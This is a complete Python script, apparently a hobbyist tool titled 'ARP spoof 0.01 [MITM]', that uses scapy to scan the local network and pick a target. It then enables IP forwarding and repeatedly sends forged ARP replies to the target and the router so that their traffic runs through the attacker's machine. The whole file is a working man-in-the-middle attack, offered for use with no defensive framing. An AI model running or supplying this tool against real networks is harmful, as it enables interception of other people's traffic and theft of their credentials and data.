#!/usr/bin/env python3
import scapy.all as scapy
import subprocess
import re
import time


def greet():
    subprocess.call(["clear"])
    print("ARP spoof 0.01 [MITM] by Ravehorn\n")


def ifconfig():
    print("Running ifconfig:\n")
    subprocess.call(["ifconfig"])
    interface = input("Interface -> ")
    print("\n")
    interface_info = str(subprocess.check_output(["ifconfig", interface]))
    my_ip = str(re.findall(r"inet\s\w*\.\w*\.\w*\.\w*", interface_info))
    my_ip = re.findall(r"\w*\.\w*\.\w*\.\w*", my_ip)
    my_ip = my_ip[0]
    scan_range = re.findall(r"\w*\.\w*\.\w*\.", my_ip)
    scan_range = scan_range[0]
    router_ip = scan_range + "1"
    scan_range += "1/24"
    return interface, my_ip, scan_range, router_ip


def arping(scan_range, router_ip):
    print("Specify range to scan -> " + scan_range)
    print("\n")
    ans, _ = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=scan_range), timeout=2)
    ans = list(ans)
    answered = {}
    for entry in ans:
        entry = str(entry)
        pdst = re.findall(r"pdst=\w*\.\w*\.\w*\.\w*", entry)
        pdst = re.findall(r"\w*\.\w*\.\w*\.\w*", str(pdst))
        pdst = pdst[0]
        hwsrc = re.findall(r"hwsrc=\w*:\w*:\w*:\w*:\w*:\w*", entry)
        hwsrc = re.findall(r"\w*:\w*:\w*:\w*:\w*:\w*", str(hwsrc))
        hwsrc = hwsrc[0]
        answered[pdst] = hwsrc
    for pair in answered.items():
        print(pair)
    router_mac = answered[router_ip]
    print("\n")
    return router_mac, answered


def select(my_ip, router_ip, router_mac, answered):
    print("Your IP -> " + my_ip)
    print("Router IP -> " + router_ip)
    print("Router MAC -> " + router_mac)
    target_ip = input("Target IP -> ")
    target_mac = answered[target_ip]
    print("Target MAC -> " + target_mac)
    return target_mac, target_ip


def port_forwarding():
    print("\nEnabling PF:")
    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
    print("Done.\n")


def create_packets(mode, target_ip, target_mac, router_ip, router_mac):
    if mode == "spoof":
        target_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip)
        router_packet = scapy.ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=target_ip)
    elif mode == "restore":
        target_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip, hwsrc=router_mac)
        router_packet = scapy.ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=target_ip, hwsrc=target_mac)
    return target_packet, router_packet


def spoof(target_packet, router_packet, target_ip, target_mac, router_ip, router_mac):
    print("Spoofing:")
    try:
        packets_count = 0
        while True:
            scapy.send(target_packet, verbose=False)
            scapy.send(router_packet, verbose=False)
            packets_count += 2
            print("\r[+] Packets sent: " + str(packets_count), end="")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n")
        target_packet, router_packet = create_packets("restore", target_ip, target_mac, router_ip, router_mac)
        restore(target_packet, router_packet)
        print("Quitting.")


def restore(target_packet, router_packet):
    scapy.send(target_packet, verbose=False)
    scapy.send(router_packet, verbose=False)
    print("Normal connection restored.")


greet()
interface, my_ip, scan_range, router_ip = ifconfig()
router_mac, answered = arping(scan_range, router_ip)
target_mac, target_ip = select(my_ip, router_ip, router_mac, answered)
port_forwarding()
target_packet, router_packet = create_packets("spoof", target_ip, target_mac, router_ip, router_mac)
spoof(target_packet, router_packet, target_ip, target_mac, router_ip, router_mac)
